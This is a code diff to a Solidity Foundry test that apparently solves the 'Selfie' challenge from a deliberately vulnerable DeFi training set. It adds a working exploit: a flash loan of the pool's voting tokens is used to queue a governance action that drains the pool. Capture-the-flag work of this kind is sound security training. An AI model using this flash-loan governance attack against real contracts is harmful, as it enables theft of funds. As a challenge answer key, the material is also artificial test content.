@@ -5,9 +5,10 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
 
-contract SelfieChallenge is Test {
+contract SelfieChallenge is Test, IERC3156FlashBorrower {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
@@ -62,7 +63,21 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        pool.flashLoan(this, address(token), TOKENS_IN_POOL, "");
+        vm.warp(block.timestamp + 3 days);
+        governance.executeAction(1);
+    }
+
+    function onFlashLoan(address initiator, address _token, uint256 amount, uint256 fee, bytes calldata _data)
+        external
+        returns (bytes32)
+    {
+        token.delegate(address(this));
+        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
+        governance.queueAction(address(pool), 0, data);
+        token.approve(address(pool), TOKENS_IN_POOL);
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 
     /**
